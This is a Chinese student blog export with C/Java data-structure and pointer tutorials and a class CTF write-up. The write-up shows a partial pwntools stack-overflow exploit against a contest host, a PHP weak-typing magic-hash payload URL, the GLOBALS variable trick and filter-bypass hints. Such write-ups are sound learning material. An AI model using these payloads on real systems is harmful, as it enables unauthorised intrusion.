pListA-&gt;iTotalLength + pListB-&gt;iTotalLength; (*pListC)-&gt;pElem= (Elemtype *)malloc( (*pListC)-&gt;iTotalLength * sizeof(Elemtype)); if ((*pListC)-&gt;pElem==NULL) { if ((*pListC) != NULL) free(*pListC); *pListC= NULL; return MALLOC_ERROR; } //将A表的数据依次复制到C表数据区 for(i= 0; i&lt;pListA-&gt;iCount; i++) (*pListC)-&gt;pElem[i]= pListA-&gt;pElem[i]; (*pListC)-&gt;iCount= pListA-&gt;iCount; for (i=0; i&lt;pListB-&gt;iCount; i++) { ret = SearchByValue(pListA, pListB-&gt;pElem[i]); if ( ret &gt;= 0 &amp;&amp; MergeOption==0) //现有重复的元素,且不允许重复 { //什么都不做，不执行插入操作 } else //没找到，没有重复的元素 { SeqListInsert(*pListC, (*pListC)-&gt;iCount, pListB-&gt;pElem[i]); //将LB[i]插入到新表LC的末尾 } } return 0; } //测试代码，或者主程序代码，在测试InitList函数时，由你自己随意编写；在提交老板后，由项目经理或高级程序员负责编写 int main(void) { int ret, i; SeqList List2; //内存中为List2这个结构体变量分配4+4+4=12个字节 Elemtype myValue; Elemtype *pmyValue= &amp;myValue; SeqList *pList1= NULL; //内存中为pList1这个结构体指针变量分配4个字节 SeqList *pList2= NULL; //创建演示 ret= InitList( &amp;pList1 ); //注意，InitList需要的是一个结构体变量的地址，故传&amp;pList1 if (ret==0) printf(&quot;创建空的顺序表成功！表的理论总长为%d,每次如果不够，自动增长值为%d&quot;, LIST_INIT_SIZE, LISTINCREMENT); else { printf(&quot;未能成功分配顺序表的数据存储空间，创建顺序表失败！&quot;); return 0; } ret= InitList( &amp;pList2 ); //注意，InitList需要的是一个结构体变量的地址，故传&amp;List2 if (ret==0) printf(&quot;创建空的顺序表成功！表的理论总长为%d,每次如果不够，自动增长值为%d&quot;, LIST_INIT_SIZE, LISTINCREMENT); else { printf(&quot;未能成功分配顺序表的数据存储空间，创建顺序表失败！&quot;); return 0; } for (i= 0; i&lt;5; i++) { SeqListInsert(pList1, i, (Elemtype)(&apos;H&apos;-i)); } for (i= 0; i&lt;5; i++) { SeqListInsert(pList2, i, (Elemtype)(&apos;A&apos;+i));//??? } //访问演示 ret= GetValue(pList1, 2, pmyValue); //注意在Debug状态下看看*pmyValue的变化，理解数据传递的方向（从子函数给主调函数） if (ret==0) printf(&quot;你要读取表中第%d个元素，其值是%c&quot;, 2, *pmyValue); //主调函数使用子函数传出来的数据 else printf(&quot;你要读取表中第%d个元素，本表不存在这个元素！&quot;, 2); //无序表的合并 DisorderSeqListMerge(pList1, pList2, 1, &amp;pList2); return 0; } Java代码实现/* 适用于Java */ //定义Person类 class Person { public int id; public String name; public Person(int id,String name) { this.id=id; this.name=name; } public void show() { System.out.println(&quot;学号: &quot;+id+&quot; --- &quot;+&quot;姓名: &quot;+name); } } //顺序表操作 class SeqList { private int currlen;// 线性表现在的长度 static final int maxsize = 100;//理论最大为100个元素 private int totalLen;// 线性表的总长度 Person[] data=new Person[maxsize+1]; //初始化表 public void InitList(SeqList arr) { arr.currlen=0; } //表的现有长度 public int ListLen(SeqList arr) { return (arr.currlen); // System.out.println(arr.currlen); } //判断表是不是空 public boolean isEmpty() { return (currlen==0)?true:false; } //添加数据 public int add(SeqList arr,Person data) { if(arr.currlen&gt;maxsize){ System.out.println(&quot;顺序表已满,不能插入节点&quot;); return 0; } arr.data[arr.currlen++]=data; return 1; } //查找元素的值(根据下标) public void SearchByIndex(SeqList arr,int n) { if( n&lt;0 || n&gt;arr.currlen) { System.out.println(&quot;呀！出错啦！检查一下！&quot;); } else { System.out.println(arr.data[n-1].id+&quot;---&quot;+arr.data[n-1].name); } } //查找元素的下标(根据元素的值) public int SearchByValue(SeqList arr,Person data) { int pos=0; while (pos&lt;=arr.currlen-1 &amp;&amp; arr.data[pos]!=data) { pos++; } if(pos &lt;= arr.currlen-1) { return pos; } else { System.out.println(&quot;没有找到这个下标呀！&quot;); } return 1; } //插入数据 public int insert(SeqList arr,int pos, Person d) { int i; if(pos&lt;0) { return -1; } if(pos &gt; arr.currlen) pos = arr.currlen; //装满的情况 if(arr.currlen &gt;= maxsize) { System.out.println(&quot;顺序表装满了，不能插入啦！&quot;); } //将顺序表数据往后移 for (i = arr.currlen;i&gt;=pos ;i-- ) { arr.data[i+1] = arr.data[i]; } arr.data[pos]=d; arr.currlen++;// 元素增加！！！ return 1; } //删除数据 public int delete(SeqList arr,int n) { int i; if(n&lt;=0 || n&gt;=arr.currlen) { System.out.println(&quot;输入出错啦，不能删除！&quot;); return 0; } for (i=n;i&lt;arr.currlen ;i++ ) { arr.data[i]=arr.data[i+1]; } arr.currlen--; return 1; } //显示所有数据 public int showData(SeqList arr) { int i; for (i=0;i&lt;=arr.currlen-1; i++) { System.out.println(arr.data[i].id+&quot;---&quot;+arr.data[i].name); } return 0; } } class SeqlistTest { public static void main(String[] args) { //开始测试 System.out.println(&quot;-----------------&quot;); System.out.println(&quot;以下是测试&quot;); SeqList arr= new SeqList(); //初始化 System.out.println(&quot;---------初始化测试--------&quot;); arr.InitList(arr); System.out.println(&quot;初始化完成&quot;); System.out.println(); //查看初始化是否完成 System.out.println(&quot;---------确认初始化是否完成--------&quot;); int i = arr.ListLen(arr); // 添加数据 System.out.println(); System.out.println(&quot;--------添加数据：张三和李四等5人---------&quot;); Person data1=new Person(1,&quot;张三&quot;); Person data2=new Person(2,&quot;李四&quot;); Person data3=new Person(3,&quot;王五&quot;); Person data4=new Person(4,&quot;唐僧&quot;); Person data5=new Person(5,&quot;孙悟空&quot;); Person data6=new Person(6,&quot;李倩&quot;); arr.add(arr,data1); arr.add(arr,data2); arr.add(arr,data3); arr.add(arr,data4); arr.add(arr,data5); //显示数据 System.out.println(); System.out.println(&quot;--------测试显示数据---------&quot;); arr.showData(arr); //判断表是不是空 System.out.println(); System.out.println(&quot;--------判断表是否为空---------&quot;); boolean m = arr.isEmpty(); System.out.println(m); //查找元素的值(根据下标) System.out.println(); System.out.println(&quot;--------查找元素的值（根据下标），查找1---------&quot;); arr.SearchByIndex(arr,1); //查找元素的下标(根据元素的值) System.out.println(); System.out.println(&quot;---------查找元素的下标（根据值）：查找李四--------&quot;); int index = arr.SearchByValue(arr,data2) ; //m是接收哪个下标 arr.SearchByIndex(arr,index+1); //插入数据 System.out.println(); System.out.println(&quot;-------测试插入数据，在arr[1]那里插入李倩----------&quot;); int res1 = arr.insert(arr,1, data6); arr.showData(arr);//看一下现在表什么样子 //删除数据 System.out.println(); System.out.println(&quot;-------测试删除数据：删除李倩----------&quot;); arr.delete(arr,1); arr.showData(arr); //表的现有长度 System.out.println(); System.out.println(&quot;--------测试表现在有的长度---------&quot;); int len = arr.ListLen(arr); System.out.println(len); } }]]></content>
      <categories>
        <category>数据结构</category>
      </categories>
      <tags>
        <tag>数据结构</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[班级对抗赛write up]]></title>
    <url>%2F2018%2F01%2F18%2F1%2F</url>
    <content type="text"><![CDATA[十年饮冰，难凉热血。 前言已经很久没有更新了，这个比赛的wp本来一直说要上传上来的，但是后来每周都是考试，就一直拖着。emmmm，还有就是，因为这学期get了印象笔记配合马克飞象，有时候有些想法就直接写在印象笔记里面了，没有直接传到博客上。这学期发现自己莫名喜欢上数据结构，接下来有时间就把一些整理的数据结构的知识整理上来好了。嘻嘻嘻嘻~这学期还不赖，和好多大佬友链了！！！！哈哈哈哈哈哈哈哈~ 说明这个比赛形式是每个班出队伍进行比赛的，一队伍三个人，比赛时间是11.25，所以真的过了好久了。 队伍名称、队伍成员 队伍名称：facker （哈哈哈哈，我不会说这个名字是我取的） 队伍成员: P4aw_N、M3tar、shEr0 解决题目解决题目：RE：送分题、pwnfun、爆破misc: 签到、热身upupup、计算题哦、芬奇的日记、RRRSAweb: web1、送分代码审计、web2、Amazing magic、Love China、加0题 解题思路Re1.送分题下载下来，扔到od,因为是送分题，也不想太复杂，搜索一下ascii，看到一串base64 flag:D0g3{Re_1s_v3ry_ea5y!} 2.pwnfun根据题目所说一个很简单的栈溢出，开始以为是写shellcode之类的利用，后来发现出题人心软了直接用ida反编译查看如下： 溢出点很明显，变量v4距离rbp为0x88个字节，却读入了0x100个字节emmmm开始的想法是写shell code利用，因为泄露栈地址很麻烦，得不到shellcode的地址，所以不行，很头大后来，看ida发现出题人心软了，给了一个函数good_game 所以就很简单了，栈溢出控制返回地址，进而控制rip跳转到good_game函数执行即可exp如下 from pwn import * HOST = &apos;222.18.158.244&apos; PORT = 2333 payload = &apos;a&apos; * over_len payload += p64(buf_addre) io.recvuntil(&apos;Input your message:\n&apos;) io.sendline(payload) io.interactive() 3.爆破运行文件，Admin已经给出了，应该是获取文本框内容然后比对即可 题目给出爆破的提示，老老实实爆破找到关键的流程处 往下执行，将全部跳转改到指向成功的函数那即可得到flagD0g3{Winner_Winner_Chicken_Dinner!} web1.web1进去直接源码出来，看到最后一行，eval(“var_dump($$args)”) 可变变量，传一个全局数组变量。args=GLOBALS 2.送分代码审计看源码啥也没有，考虑源码泄露。而且源码里面base64也提示了 down下来，看到源码的意思是$flag1 &amp;&amp; $flag2 &amp;&amp; $flag3 都为真，就可以出flag。那本地调试一下。构造出payload:http://45.32.90.22:2501/index.php?name=xiaohong&amp;&amp;sex=nv&amp;&amp;key=240610708&amp;&amp;pen=240610708&amp;&amp;apple=QNKCDZO这里源码中考察了php弱类型，==和===的区别这里因为出现了比较，而在0e中是读取的科学计数法，构造出来的key的md5也是0e就ok，故构造$key = “240610708”;下面 同理构造。payload如上， 这里给一个学习php弱类型的网站： https://www.cnblogs.com/Mrsm1th/p/6745532.html 3.web2这里看到源码，strlen可以通过%00来截断绕过，id==0 随便测试传个值，b需要绕过eregi 用00截断 data通过使用伪协议绕过stripospayload: 4.Amazing magicpost随便传个值后在页源码中发现一句提示 接着post key=source 得到源码，源码要让number==14598366 但是字符并不能相同，所以这里想到通过转换进制 使用两个进制进行比较 把14598366转换为16进制得到0xdec0de所以key=0xdec0de 5.Love China这个题要点100万次，可能不行。这里本来是想会不会有什么脚本可以跑。但是，看了一下F12。改js啊，修改clicks的值，抓包，传一个大于1000000的值，就出来了。 6.加0题 页面给出robo.txt提示访问 url编码，传输过去后会被默认解码一次，所以将jia0编码两次，再传入就可以得到flag Misc1.热身upupup音频隐写，没有密码提示。直接扔Au摩斯电码：..- ..- ..- - ..- - ..- ..- -D0g3{UUUTUTUUT} 2.计算题哦长度被限制，直接改一下length出现的弹窗，base64解码 3.芬奇的日记 下载下来是一张png图片，先放到kali看看能不能分离 发现有两张png图片，那么就dd分离 得到了一张二维码的图片 用stegsolve打开调制Gray bits得到二维码 然后扫描得到下面的一串编码 Base64解一下得flag 4.RRRSA首先还是要学习一下RSA算法是什么，下面贴一下学习的地方。 http://bobao.360.cn/learning/detail/3058.html 在这里主要思路就是先通过n计算出p,q，通过p,q再计算出d，之后就可以求出m。就在我上面贴的网址里面有可以求出p,q的值的网址。解出来p,q的值。写一个py脚本跑一下d的值。 def egcd(a, b): if a == 0: return (b, 0, 1) else: g, y, x = egcd(b % a, a) return (g, x - (b // a) * y, y) def modinv(a, m): g, x, y = egcd(a, m) if g != 1: raise Exception(&apos;modular inverse does not exist&apos;) else: return x % m p = 17 q = 40945572069996101 e = 65537 d=modinv(e,(p-1)*(q-1)) print(d) 跑出来d的值。继续写一个脚本，出m的值。这里因为学艺不精，只能一直修改c的一行一行的值来解密。 c=185467894761485820 d=232174645015238273 n=696074725189933717 m=pow(c,d,n) print hex(m)[2:len(hex(m))-1].decode(&apos;hex&apos;) 这里c的值，要一行一行的换这里就贴一部分了，最后解出来，就是这样。]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[指针数组和数组指针]]></title>
    <url>%2F2017%2F09%2F09%2F%E6%8C%87%E9%92%88%E6%95%B0%E7%BB%84%E5%92%8C%E6%95%B0%E7%BB%84%E6%8C%87%E9%92%88%2F</url>
    <content type="text"><![CDATA[滴水石穿，非一日之功。 前言我觉得和前面一篇就是兄弟文了。这篇就写指针数组，数组指针的一些杂七杂八的东西了。虽然写起来很头疼，但是好记性不如烂笔头啊！然后再让我感叹一下，中文真是博大精深~ 指针数组什么是指针数组 指针数组 ： 数组的每一个元素是指针 指针数组：array of pointers，即用于存储指针的数组，也就是数组元素都是指针 指针数组怎么定义类型* 数组名[数组长度] int* p[n] []优先级高，先与p结合成为一个数组，再由int*说明这是一个整型指针数组，它有n个指针类型的数组元素。 元素表示：*p[i] *(p[i])是一样的，因为[]优先级高于* 注意：在实际应用中，对于指针数组，我们经常这样使用： typedef int* pInt; pInt a[4]; 使用快速入门如要将二维数组赋给一指针数组: int *p[3]; int a[3][4]; for(i=0;i&lt;3;i++){ p[i]=a[i]； p++; //该语句表示p数组指向下一个数组元素。注：此数组每一个元素都是一个指针 } 这里int *p[3] 表示一个一维数组内存放着三个指针变量，分别是p[0]、p[1]、p[2]所以要分别赋值。 实现/* 指针数组的使用示例 指针数组的概念——是一个数组，数组中的每个元素是一个指针。本例假设数组是一维的。（多维指针数组在实际中很少遇到） 本例采用简单选择排序，对指针数组中的所有元素进行排序。 需要提醒注意的是，本例的排序只是改变了指针的指向，并没改变常量字符串在程序常量区里面内存空间的位置和长度大小等！ */ #include &lt;stdio.h&gt; void sort(char *name[], int n); void printf(char *name[], int n); int main(void) { /* 定义了一个指针数组name，通过字符串赋初值的方式给name中的每个元素（一个指针）赋初值 需要注意的是：此处这种赋初值的方式，字符串常量全都是存储在程序的常量区，并且是根据 字符串的实际长度来申请的空间（此步骤由编译系统自动完成，无需程序员再去malloc）。另 外，数组的长度，也是有编译器自动确定的。 如果各个字符串的值事先不确定，需要程序运行时由用户来确定，则本程序仍然需要调用malloc 函数去实现。 */ char *name[]={&quot;Follow me&quot;, &quot;BASIC&quot;, &quot;Great Wall&quot;, &quot;FORTRAN&quot;, &quot;Computer design&quot;}; int n = 5; sort(name, n); printf(name, n); return 0; } /*************************************************************************************** 基于指针元素类型的数组的简单选择排序方法 排序算法不变，只不过此处元素是指针，指向字符串，所以相互的比较需要借助strcmp函数来实现， 而不是直接使用&gt;或&lt;号 **************************************************************************************/ void sort(char *name[], int n) { char *temp; int i, j, k; for (i = 0; i &lt; n - 1; i++) //确定子序列的变化的左端 { k = i; //假定子序列的第一个元素是最大的 for (j = i + 1; j &lt; n; j++) { if (strcmp(name[k], name[j]) &gt; 0) { k=j; //若后续元素更大，则刷新最大元素下标k } } if (k != i) //找到最大元素下标k的值之后，将最大值和第一个元素的值交换 { temp = name[i]; name[i] = name[k]; name[k] = temp; } } } void printf(char *name[], int n) { int i; for(i = 0; i &lt; n; i++) { printf(&quot;%s\n&quot;, name[i]); } } 图解 数组指针什么是数组指针数组指针 ： 本质是指针（四个字节的变量） 指向数组的指针 数组指针：a pointer to an array，即指向数组的指针 数组指针怎么定义类型说明符 (* 指针变量名) [数组长度] int (*p)[n]; ()优先级高，首先说明p是一个指针，指向一个整型的一维数组，这个一维数组的长度是n，也可以说是p的步长。也就是说执行p+1时，p要跨过n个整型数据的长度。 使用快速入门元素表示：(*p)[i] 如要将二维数组赋给一指针，应这样赋值： int a[3][4]; int (*p)[4]; //该语句是定义一个数组指针，指向含4个元素的一维数组。 p=a; //将该二维数组的首地址赋给p，也就是a[0]或&amp;a[0][0] /*也可以p=&amp;a[0][0];*/ p++; //该语句执行过后，也就是p=p+1;p跨过行a[0][]指向了行a[1][] 实现图解 案例1(数组指针和指针数组的对比)#include &lt;iostream&gt; using namespace std; int main() { int c[4]={1,2,3,4}; int *a[4]; //指针数组 int (*b)[4]; //数组指针 b=&amp;c; //将数组c中元素赋给数组a for(int i=0;i&lt;4;i++) { a[i]=&amp;c[i]; } //输出看下结果 cout&lt;&lt;*a[1]&lt;&lt;endl; //输出2就对 cout&lt;&lt;(*b)[2]&lt;&lt;endl; //输出3就对 return 0; } 注意：定义了数组指针，该指针指向这个数组的首地址，必须给指针指定一个地址，容易犯的错得就是，不给b地址，直接用(*b)[i]=c[i]给数组b中元素赋值，这时数组指针不知道指向哪里，调试时可能没错，但运行时肯定出现问题，使用指针时要注意这个问题。但为什么a就不用给他地址呢，a的元素是指针，实际上for循环内已经给数组a中元素指定地址了。但若在for循环内写*a[i]=c[i]，这同样会出问题。 案例2#include &lt;stdio.h&gt; int main() { int a[2][2]={1,2,3,4};//这是一个2*2的二维数组 int (*p)[2];//数组指针 p=a;//令p指向数组a return 0; } 分析数组，指针变量在内存中的存放 a中各个元素在内存中的样子 现在我们思考a,a[0],a[1],p,a+1,a[0]+1,p+1到底是什么？ 分析： a是一个数组名，类型是指向一维数组的指针，不是变量，a的值是指针常量，即不能有a++或者a=p这些操作。a指向这块连续空间的首地址，值是&amp;a[0][0]。 a[0]是一维数组名，类型是指向整型的指针，值是&amp;a[0][0]，这个值是一个常量。 a[1]是一维数组名，类型是指向整型的指针，值是&amp;a[1][0]，这个值是一个常量。 p是一个数组指针变量，指向一维数组的指针变量，值是&amp;a[0][0]。可以执行p++;p=a等操作。 a+1表示指向下一行元素，也可以理解为指向下一个一维数组。 *(a+1)是取出第一行的首地址。 a[0]+1是指向第0行第1个元素，也可以理解为指向一维数组a[0]的第一个元素。 p+1同a+1 *(p+1)同*(a+1) 虽然a跟a[0]值是一样，但类型不一样，表示的意义不一样。通过分析就不难理解为什么*(*(a+i)+j)和a[i][j]等效了。 其他1.数组名和数组指针变量的长度案例1#include&lt;stdio.h&gt; int main() { int a[2][2]={1,2,3,4};//这是一个2*2的二维数组 int (*p)[2];//数组指针 p=a;//令p指向数组a printf(&quot;%d\n%d\n&quot;,sizeof a,sizeof p); return 0; } 输出： 16 4 p是一个指针变量，这个变量占用四个字节。而a是数组名，所以sizeof a返回数组a中的全部元素占用的字节数。 案例2include&lt;stdio.h&gt; int main() { int a[2][2]={1,2,3,4};//这是一个2*2的二维数组 int (*p)[2];//数组指针 p=a;//令p指向数组a printf(&quot;%d\n%d\n&quot;,sizeof(a+1),sizeof(p+1)); printf(&quot;%d\n%d\n&quot;,sizeof(a+0),sizeof(p+0)); return 0; } 输出： 4 4 4 4 a在做+运算时是转化成了指针变量，但a[i]是一个一维数组的数组名，sizeof(a[0])的值是8。 案例3#include&lt;stdio.h&gt; void f(int a[][2]) { printf(&quot;%d\n&quot;,sizeof a); } int main() { int a[2][2]={1,2,3,4};//这是一个2*2的二维数组 printf(&quot;%d\n&quot;,sizeof a); f(a); return 0； } 输出： 16 4 因为传参的时候数组名a转化成指针变量，注意到函数f中f(int a[][2])这里并不需要指定二维数组的长度，此处可以改为int (*a)[2]。所以传过来的就是一个数组指针变量。 2.转化p+1 &lt;-&gt; a+1 &lt;-&gt; &amp;a[1] &lt;-&gt; &amp;p[1] *(p+1) &lt;-&gt; *(a+1) &lt;-&gt; a[1] &lt;-&gt; p[1] p+i &lt;-&gt; a+i &lt;-&gt; &amp;a[i] &lt;-&gt; &amp;p[i] *(p+i) &lt;-&gt; *(a+i) &lt;-&gt; a[i] &lt;-&gt; p[i] 3.数组指针的一维和二维数组一维数组如果a是一维数组，则有如下： a表示数组的首地址，即数组中第0个元素的地址 *a= *(a+0) &lt;-&gt; a[0] ，表示数组的第0个元素的值- *(a+i) &lt;-&gt; a[i] 是a一维数组的第i个元素的值 二维数组如果a是二维数组，则有如下： a表示数组的首地址，即数组中第0行的首地址 a+i是数组中第i行的首地址，即行指针 *a= *(a+0) &lt;-&gt; a[0]是数组第0行的数组名，第0行第0列的起始地址；也可以看成是a一维数组的第0个元素(行)的地址 *(a+i) &lt;-&gt; a[i]是数组第i行的数组名，第i行第0列的起始地址；也可以看成是a一维数组的第i个元素(行)的地址 *(a+i)+j &lt;-&gt; a[i]+j &lt;-&gt; &amp;a[i][j]是第i行第j列的起始地址，即列指针 *(*(a+i)+j) &lt;-&gt; *(a[i]+j) &lt;-&gt; a[i][j]是第i行第j列的元素值 4.*(p++)与*(++p)的区别注：*p++ &lt;-&gt; *(p++)*(p++)是先执行 *p，后指针p累加，指向下一个地址 *（++p）是先将p加一后再指向结果所在的地址]]></content>
      <categories>
        <category>数据结构</category>
      </categories>
      <tags>
        <tag>数据结构</tag>
        <tag>C语言</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[指针函数和函数指针]]></title>
    <url>%2F2017%2F09%2F09%2F%E6%8C%87%E9%92%88%E5%87%BD%E6%95%B0%E5%92%8C%E5%87%BD%E6%95%B0%E6%8C%87%E9%92%88%2F</url>
    <content type="text"><![CDATA[冰冻三尺，非一日之寒。 前言指针函数，函数指针，指针数组，数组指针。这些个概念，感觉一直都是迷迷糊糊的不是特别的明白。最近因为在做SYC的C语言，发现后面的题，基本上都是指针指过来指过去的，就索性用了一晚上来弄这个东西。记录一下，以便以后遗忘还可以再看。 指针函数什么是指针函数 指针函数 ： 返回值是指针的函数 指针函数本质是一个函数，函数返回类型是某一类型的指针。 指针函数怎么定义类型标识符 *函数名(参数表) int *f(int x,int y) ()优先级高，先与f结合成为一个函数，再由int *说明一个这是一个整型的指针函数。 使用快速入门这个使用法，我是这样理解的，因为这个函数是有返回值的，返回值的类型是一个地址，那么用的时候，就应该是这样。 float *fun(int x);//指针函数 float *p;//定义的一个指针 p = fun(a);//fun(a)是一个地址值，因为定义上他是一个指针函数，那么，它的返回值就是一个地址 实现#include &lt;stdio.h&gt; float *search(float (*pointer)[4], int n);//数组指针可以看下一章 int main(void) { float score[][4]={{60,70,80,90},{56,89,67,88},{34,78,90,66}}; float *p; int i, m; printf(&quot;enter the number of student:&quot;); scanf(&quot;%d&quot;, &amp;m); printf(&quot;The scores of No. %d are:\n&quot;,m); p=search(score, m);//这里就是指针函数的应用，返回的就是一个地址 for (i = 0; i &lt; 4; i++) { printf(&quot;%5.2f\t&quot;, *(p + i)); //*(p + i)，第m行第i列的元素值（m和i都从0编号） } printf(&quot;\n&quot;); return 0; } float *search(float (*pointer)[4], int n) { float * pt; pt = *(pointer + n); //将第n行第0列的地址给pt，以供返回 return (pt);//这里返回的就是一个地址 } 函数指针什么是函数指针函数指针 ： 指向函数的指针 函数指针本质是一个指针变量，是指向函数的指针变量 函数指针怎么定义类型说明符 (* 指针变量名（函数名）) (参数) int (*f)(int a, int b); ()运算符，自左至右，首先说明f是一个指针，指向一个返回值是整型的函数。 使用快速入门int (*f) (int x); /*声明一个函数指针 */ f=func; /* 将func函数的首地址赋给指针f */ 指向函数的指针包含了函数的地址的入口地址，可以通过它来调用函数。 这个特殊的指针指向一个返回整型值的函数。指针的声明必须和它指向函数的声明保持一致。 指针名和指针运算符外面的括号改变了默认的运算符优先级。如果没有圆括号，就变成了一个返回整型指针的函数的原型声明。 实现案例1#include &lt;stdio.h&gt; int max(int x,int y) { return (x&gt;y ? x : y); } int main(void) { int (*p)(int ,int);//函数指针：数据类型标志符 （指针变量名）（形参列表） int a,b,c; p=max; //将max函数的首地址给指针f scanf(&quot;%d%d&quot;,&amp;a,&amp;b); c=(*p)(a,b); //指针进行调用函数 printf(&quot;a=%d,b=%d,max=%d\n&quot;,a,b,c); return 0; } /*这里p指的是一个指针变量，不像函数名字，他可以指向任何函数*/ p变量里面存放了max函数的地址。*p，此时，就相当于是取这个函数了（可以这么去理解），用来进行调用函数了。相当于是p存放了max这个函数的地址，在用指针去调用函数max时，需要写成（*p）这个样子 案例2代码下面的这个案例来说明一下上面这个问题 #include &lt;stdio.h&gt; int asdf(int a) { printf(&quot;%d\n&quot;,a); return 0; } int main(void) { int (*p)(int); asdf(5); //通过函数名调用函数 p=asdf; //将asdf函数的首地址给指针p (*p)(5); //调用函数asdf p(5); //调用函数asdf printf(&quot;asdf is %d,p is %d,*p is %d\n&quot;,asdf,p,*p); return 0; } 输出: 5 5 5 asdf is 4198410,p is 4198410,*p is 4198410 解释1.通过函数名调用函数和通过函数指针调用函数的区别 答： 1) 通过函数名调用函数eg:asdf(5); 步骤：根据已知函数地址调用对应函数。 2) 函数指针调用函数eg:(*p)(5); 1.从指针中读取函数入口地址。2.调用对应函数。 它们之间的区别一句话概括，那就是函数名是入口地址的代号，只在编译时发挥作用（等价于一个固定地址，所以函数名不能被赋值），函数指针在执行期发挥作用（指针值可以变化，可以赋值。所以(*p)(5)与asdf(5)等价 2.为什么(*p)(5)与p(5)结果相等 利用函数指针进行调用： (*p)()p() 很久很久以前C语言只允许前者，后来大家觉得这么写太麻烦就规定了后者能达到同样效果。后者在编译时和前者做相同的事情。它只是语法上的便利,本质上是一样的. 类似的语法上的便利还有:p-&gt;h 通过指针访问结构成员，等价于 (p).hp[n] 通过指针访问数组元素等价于 (p+n) 案例三 /* 函数指针的使用示例 在下面的例子中，着重学习如何通过fun函数中的第三个参数来实现对加减乘等操作的处理。 需要注意以下几点： 1. fun函数中第三个形参，函数指针的书写格式int (*p)(int, int)和使用格式(*p)(x, y) 2. 在调用fun函数时，送入的实参可以有两种形式。 A. 函数指针作为实参——注意ppp的定义格式 int (*ppp)(int, int); ppp的赋值写法 ppp= max; 注意，没有括号！没有形参表！此处是将max函数在程序代码区中存储的首地址赋给ppp，并不是函数调用！ ppp作为实参的写法 fun(a, b, ppp) 没有括号，没有形参表！此处，fun的第三个参数ppp就是一个地址 B. 函数名称作为实参——注意书写格式 fun(a, b, add); 在C语言中，函数名字本身，和数组名称类似，代表了其在内存中存储的首地址 */ #include &lt;stdio.h&gt; int fun(int x, int y, int (*p)(int, int)); int max(int x, int y); int min(int x, int y); int add(int x, int y); int main(void) { int a = 34, b = 22, result; char n; int (*ppp)(int, int); ppp= NULL; printf(&quot;请选择：1.求大值，2.求小值，3.求和:&quot;); n = getchar(); switch(n) { case &apos;1&apos;: ppp= max; result = fun(a, b, ppp); break; case &apos;2&apos;: result = fun(a, b, min); break; case &apos;3&apos;: result = fun(a, b, add); break; default: printf(&quot;选择错误！\n&quot;); } printf(&quot;%d\n&quot;, result); return 0; } int fun(int x, int y, int (*p)(int, int)) //第三个参数需要一个指针p，该参数p是一个函数指针，是专门指向“有2个int型形参且返回int的这类函数”的指针 { int result; result = (*p)(x, y); //注意书写格式！ 调用该类（int XXX(int, int)）函数所需要的实参，往往都是通过“外壳”函数fun的形参x和y传进来~~ return result; } /* 注意！函数指针往往出现在当多个函数的函数类型相同的情况下！ 需要注意的是，如果max，min和add函数的类型不是 int XXX(int, int)这种类型，则不能作为fun函数的第三个参数，而 fun函数如果不能将多个子函数进行整合，则fun函数将失去其存在的意义！ */ int max(int x, int y) { printf(&quot;大值是:&quot;); return x &gt; y ? x : y; } int min(int x, int y) { printf(&quot;小值是:&quot;); return x &gt; y ? y : x; } int add(int x, int y) { printf(&quot;和值是:&quot;); return x + y; } 后记洋洋洒洒的总结了那么多，终于有一种恍然大悟的感觉了，再想一下。 函数指针：指向函数的指针，可以通过这个指针调用函数，前提是要把这个函数的地址传给指针，再调用函数（*指针变量名） 指针函数：返回值是指针类型的函数。因为返回的是一个地址，通常可以和数组结合一下。比如返回某一数组元素的地址。（由于返回的是地址，就直接函数名（形参）用就可以了）]]></content>
      <categories>
        <category>数据结构</category>
      </categories>
      <tags>
        <tag>数据结构</tag>
        <tag>C语言</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[内存四区的理解]]></title>
    <url>%2F2017%2F09%2F08%2F1%2F</url>
    <content type="text"><![CDATA[蚕丛及鱼凫，开国何茫然。 前言内存四区，之前学C语言的时候，就模模糊糊的看了一下，也没有很仔细的琢磨，后来学PHP和Java在看一些视频的时候，就看到了那些培训的老师，都对这些讲述的很细。有必要系统的总结一下啦，不然底层都弄不好，还怎么学习啊。这里就懒得去找其他语言的例子来讲了，就用C语言来讲一下吧。 入门案例 详解内存四区图解内存四区 内存四区介绍栈区由编译器自动分配释放, 存放函数的参数值,局部变量等. 例如: 参数buf,参数bufsize和size都是存放在栈区.当函数执行完毕的时候,自动释放 void recev(char* buf, int bufsize){ int size; } 堆区一般由程序员分配释放(动态内存申请与释放),若程序员不释放,程序结束时可能由操作系统回收 例如:下面的src所指向的内存空间就是在堆区 char* src = (char*) malloc(sizeof(buf) * sizeof(10)); 全局区(静态区、常量区)全局变量和静态变量存放在此. 里面细分有一个常量区, 字符串常量和其他常量也存放在此. 该区域是在程序结束后由操作系统释放. 程序代码区这个区域存放函数体的二进制代码.也是由操作系统进行管理的 划分内存四区的意义C语言程序中,根据是局部变量,全局变量, 常量还是通过malloc等类似的函数分配内存空间, 把他们放到对应的内存区中.这样就赋予了这些变量或常量不同的生命周期, 不同的释放方式. 根据我们程序的需要,我们在编码过程中,声明不同的变量类型, 使他们有不同的声明长度, 不同的释放方式,给我们更大的灵活编程 理解时出现的疑问关于栈内存的进栈顺序正如入门案例图上所示，都是操作系统或者某函数的状态在最下面，接下来是返回地址。程序读取的时候，按道理难道不应该是从main函数依次往下读取，最后才能读取到返回值么？ 答标准解释执行双击的时候，是操作系统将软件加载到内存。操作系统的可执行程序也是提前加载到内存的。操作系统找到main函数入口，开始执行。操作系统将应用程序分成四个区：代码区，堆区，栈区和全局区。在网上找到这个图 更加通俗的说法：说法一： 图上main函数橙色的区域：这4块内容，在main函数执行结束之后，是先后一起弹出来的。局部变量和形参弹出来之后就丢弃了，可以视为扔掉了。返回地址和其他现场信息（运行状态信息）弹出来之后会被送到CPU或者其他相关芯片或者某些变量中，以便恢复到该程序被调用之前的状态。 说法二： 相当于现场信息是对刚开始的操作系统的运行状态拍快照，程序结束后，从main函数的栈区里面把这个快照取出来，然后去恢复环境，把环境恢复为原来调用之前操作系统的各方面的样子。 说法三：打一个比方：比如你现在正在数钱，数到第320张的时候，用户来找你，让你去执行他的main函数。你怎么办？ 